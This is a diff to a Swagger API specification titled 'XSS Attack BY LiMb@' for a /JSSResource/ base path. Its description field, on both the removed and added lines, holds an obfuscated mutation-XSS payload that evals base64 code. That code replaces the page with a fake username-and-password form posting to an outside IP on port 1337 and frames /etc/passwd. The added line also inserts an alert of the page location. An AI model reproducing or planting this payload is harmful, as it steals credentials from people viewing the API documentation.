@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack BY LiMb@
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpO2EubWV0aG9kPSdQT1NUJzthLmFjdGlvbj0naHR0cDovLzE2OC4xMTkuMTY3LjEwMToxMzM3JzthLmlubmVySFRNTD0nPGNlbnRlcj48YnI+VXNlcm5hbWU6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ1c2VyTmFtZSI+PGlmcmFtZSBzcmM9ZmlsZTovLy9ldGMvcGFzc3dkPjwvaWZyYW1lPjxicj5QYXNzd29yZDogPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPXB3ZD48YnI+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj48L2NlbnRlcj4nOyBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOyA=' onerror='eval(atob(this.id))'>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='YWxlcnQoZG9jdW1lbnQud3JpdGUod2luZG93LmxvY2F0aW9uKSk7ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpO2EubWV0aG9kPSdQT1NUJzthLmFjdGlvbj0naHR0cDovLzE2OC4xMTkuMTY3LjEwMToxMzM3JzthLmlubmVySFRNTD0nPGNlbnRlcj48YnI+VXNlcm5hbWU6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ1c2VyTmFtZSI+PGlmcmFtZSBzcmM9ZmlsZTovLy9ldGMvcGFzc3dkPjwvaWZyYW1lPjxicj5QYXNzd29yZDogPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPXB3ZD48YnI+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj48L2NlbnRlcj4nOyBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOyA=' onerror='eval(atob(this.id))'>"></form>
 
   version: production
 basePath: /JSSResource/
